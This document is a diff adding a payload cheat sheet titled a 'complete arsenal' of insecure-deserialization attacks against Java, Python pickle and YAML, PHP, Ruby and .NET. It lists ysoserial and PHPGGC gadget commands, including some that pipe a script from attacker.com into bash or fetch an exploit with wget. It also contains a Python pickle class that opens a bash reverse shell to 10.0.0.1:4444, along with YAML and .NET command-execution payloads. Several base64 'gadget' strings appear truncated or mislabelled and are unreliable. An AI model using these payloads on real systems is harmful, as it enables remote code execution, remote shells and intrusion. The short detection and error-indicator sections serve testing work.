@@ -1,0 +1,215 @@
+================================================================================
+DESERIALIZATION PAYLOADS - COMPLETE ARSENAL
+================================================================================
+
+================================================================================
+JAVA DESERIALIZATION DETECTION PAYLOADS (Base64)
+================================================================================
+
+rO0ABQ== – Minimal Java serialized object header
+rO0ABXNyABpodWRwLmNyeXB0by5TY3JpcHRTaGVsbA== – Basic Java object
+rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0 – Java ArrayList
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA== – Java HashSet
+rO0ABXNyAA5qYXZhLmxhbmcuT2JqZWN0 – Java Object
+rO0ABXNyAA1qYXZhLnV0aWwi – Truncated Java object
+aced0005 – Java serialized hex header
+aced0005737200136A6176612E7574696C2E41727261794C697374 – Hex full Java object
+
+================================================================================
+JAVA DESERIALIZATION GADGET PAYLOADS (ysoserial)
+================================================================================
+
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ== – PriorityQueue (commons-collections)
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA== – HashMap (gadget chain)
+rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuYmVhbnV0aWxzLkJlYW5Db21wYXJhdG9y – BeanComparator (commons-beanutils)
+rO0ABXNyACBvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwcy5MYXp5TWFw – LazyMap (commons-collections)
+rO0ABXNyABxjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwu – Xalan internal
+rO0ABXNyABZqYXZhLnJtaS5yZWdpc3RyeS5SZWdpc3RyeQ== – RMI Registry
+
+================================================================================
+JAVA DESERIALIZATION - YSOSERIAL GENERATION COMMANDS
+================================================================================
+
+java -jar ysoserial.jar CommonsCollections1 "calc.exe" – Generate CommonsCollections1 payload
+java -jar ysoserial.jar CommonsCollections5 "id" – CommonsCollections5
+java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/pwned" – CommonsBeanutils1
+java -jar ysoserial.jar Groovy1 "curl http://attacker.com/shell.sh | bash" – Groovy1
+java -jar ysoserial.jar Spring1 "nslookup attacker.com" – Spring1
+java -jar ysoserial.jar Jdk7u21 "whoami" – Jdk7u21
+java -jar ysoserial.jar JRMPClient "attacker.com:4444" – JRMP Client (reverse connection)
+java -jar ysoserial.jar ROME "wget http://attacker.com/exploit" – ROME
+java -jar ysoserial.jar Vaadin1 "id" – Vaadin1
+java -jar ysoserial.jar JBossInterceptors1 "id" – JBossInterceptors1
+
+================================================================================
+JAVA DESERIALIZATION - URLDNS PAYLOAD (Detection Only)
+================================================================================
+
+java -jar ysoserial.jar URLDNS "http://attacker.com/dns" – DNS callback detection payload
+Base64 output can be sent to target to test deserialization without RCE
+
+================================================================================
+PYTHON PICKLE DESERIALIZATION PAYLOADS (Base64)
+================================================================================
+
+gAJ9cQBYDAAAAG51bWVyaWNfcXVldWUA – Python pickle base64 (empty dict)
+gASVKgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKUjFJldmVsX3NvY2tldJROYmFzZTY0 – Pickle with RCE attempt
+gAJjYnVpbHRpbnMKZXZhbApxAFgFAAAAcHJpbnQocSGFcQJScQMu – Pickle eval payload
+gAJjYnVpbHRpbnMKcHJpbnQKcQBYCAAAAF9fbWFpbl9fCnEBhXECUnEDLg== – Print payload (safe test)
+gAJjYnVpbHRpbnMKb3BlbgpwAFgLAAAAL2V0Yy9wYXNzd2RccQGFcQJS - File read attempt
+
+================================================================================
+PYTHON PICKLE - MALICIOUS PAYLOAD GENERATION (Educational)
+================================================================================
+
+import pickle, base64, os
+
+class Evil:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+payload = base64.b64encode(pickle.dumps(Evil()))
+print(f"Pickle RCE Payload: {payload}")
+
+import pickle, base64, subprocess
+
+class ReverseShell:
+    def __reduce__(self):
+        return (subprocess.Popen, (('bash', '-c', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'),))
+
+payload = base64.b64encode(pickle.dumps(ReverseShell()))
+
+================================================================================
+PYTHON PICKLE - BLIND DETECTION PAYLOADS
+================================================================================
+
+gASVLwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZzbGVlcJOUjAU1LTEwLZRRLg== – Time-based sleep (5 seconds)
+gASVLwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBBwaW5nIC1jIDEgMTI3LjAuMC6UUpQu – Ping detection
+gASVNAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBdud2luZG93cyBwaW5nIC1uIDIgMTI3LjAuMC6UUpQu – Windows ping
+
+================================================================================
+PYTHON YAML DESERIALIZATION PAYLOADS
+================================================================================
+
+!!python/object/apply:os.system ["id"] – Command execution
+!!python/object/apply:subprocess.Popen ["id"] – Subprocess execution
+!!python/object/apply:builtins.eval ["__import__('os').system('id')"] – Eval based RCE
+!!python/object:__main__.EvilClass {} – Instantiate evil class
+!!python/object/new:list [!!python/object/new:tuple [1,2,3]] – Object instantiation
+!!python/object/new:object !!python/tuple [1,2] – Tuple injection
+
+================================================================================
+PHP DESERIALIZATION PAYLOADS
+================================================================================
+
+O:1:"A":0:{} – Simple PHP object
+O:8:"stdClass":0:{} – stdClass object
+O:8:"stdClass":1:{s:4:"test";s:4:"data";} – Object with property
+a:1:{i:0;s:4:"test";} – Array serialized
+O:7:"Example":2:{s:4:"test";s:4:"data";s:8:"property";s:6:"value";} – Multi-property
+
+================================================================================
+PHP DESERIALIZATION GADGET PAYLOADS (PHPGGC)
+================================================================================
+
+phpggc Monolog/RCE1 system id – Generate Monolog gadget
+phpggc Guzzle/FW1 system id – Guzzle gadget
+phpggc Laravel/RCE5 system id – Laravel gadget
+phpggc Symfony/RCE4 system id – Symfony gadget
+phpggc ThinkPHP/RCE2 system id – ThinkPHP gadget
+phpggc CodeIgniter/RCE1 system id – CodeIgniter gadget
+phpggc Yii/RCE1 system id – Yii gadget
+
+================================================================================
+PHP DESERIALIZATION - DETECTION PAYLOADS
+================================================================================
+
+O:1:"A":0:{} – Will cause __PHP_Incomplete_Class
+O:8:"stdClass":999:{} – Property count mismatch
+s:10:"short" – String length mismatch
+a:1:{i:0;s:4:"test";} – Valid array (safe test)
+
+================================================================================
+RUBY MARSHAL DESERIALIZATION PAYLOADS
+================================================================================
+
+\x04\x08o:\x0EEvilClass\x00 – Ruby marshal object
+\x04\x08o:\x0FUser\x07:\n@nameI\"\x0Fadmin\x06:\x06ET – User object with name
+\x04\x08[\x06i\a – Ruby array
+\x04\x08{\x06I\"\tkey\x06:\x06ETI\"\rvalue\x06;\x00T – Ruby hash
+
+================================================================================
+RUBY MARSHAL RCE PAYLOADS
+================================================================================
+
+% ruby -e 'Marshal.dump({"a" => "b"})' – Dump object
+% ruby -e 'class Evil; def initialize; system("id"); end; end; puts Marshal.dump(Evil.new).inspect' – RCE attempt
+
+================================================================================
+.NET DESERIALIZATION PAYLOADS (ViewState/XML)
+================================================================================
+
+/wEWBQ/viewstate – ASP.NET ViewState injection
+__VIEWSTATE= – ViewState parameter
+{"__type":"System.Diagnostics.Process", "StartInfo": {"FileName":"cmd.exe","Arguments":"/c calc.exe"}} – JSON .NET deserialization
+<Obj RefId="0"><MS><S>System.Diagnostics.Process</S></MS></Obj> – XML .NET deserialization
+
+================================================================================
+DESERIALIZATION ERROR INDICATORS (What to Look For)
+================================================================================
+
+InvalidClassException – Java
+ClassNotFoundException – Java
+StreamCorruptedException – Java
+UnpicklingError – Python pickle
+ValueError: insecure string pickle – Python
+unserialize(): Error at offset – PHP
+__PHP_Incomplete_Class – PHP
+YAMLError – Python YAML
+could not determine a constructor – YAML
+TypeError – Ruby marshal
+ArgumentError – Ruby
+InvalidCastException – .NET
+SerializationException – .NET
+
+================================================================================
+SAFE DESERIALIZATION TEST PAYLOADS (No RCE)
+================================================================================
+
+# Java - Malformed class test
+rO0ABXNyABFJbnZhbGlkQ2xhc3NOYW1l – Non-existent class
+
+# Python - Corrupted pickle
+gAJ9cQBYDgAAAHNvbWV0aGluZ3EAXXECLg== – Corrupted structure
+
+# PHP - Non-existent class
+O:1:"X":0:{}
+
+# YAML - Non-existent class
+!!python/object:__main__.NonExistent {}
+
+================================================================================
+DESERIALIZATION RESPONSE INDICATORS (What to Look For)
+================================================================================
+
+Exception in thread – Java error
+java.io.StreamCorruptedException – Java stream error
+ClassNotFoundException – Class not found
+Traceback (most recent call last) – Python error
+unserialize(): – PHP unserialize triggered
+Warning: unserialize() – PHP warning
+encoding error – YAML error
+Invalid option – YAML error
+
+================================================================================
+REAL-WORLD DESERIALIZATION NOTABLE PAYLOADS
+================================================================================
+
+rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5 – CommonsCollections (Apache, 2015)
+!!python/object/apply:subprocess.check_output – Python YAML (CVE-2019-20477)
+Log4Shell + Deserialization – JNDI deserialization via Log4j
+O:8:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"name";s:4:"test";} – Guzzle deserialization (CVE-2020-24574)
+
+================================================================================
+END OF DESERIALIZATION PAYLOADS
+================================================================================
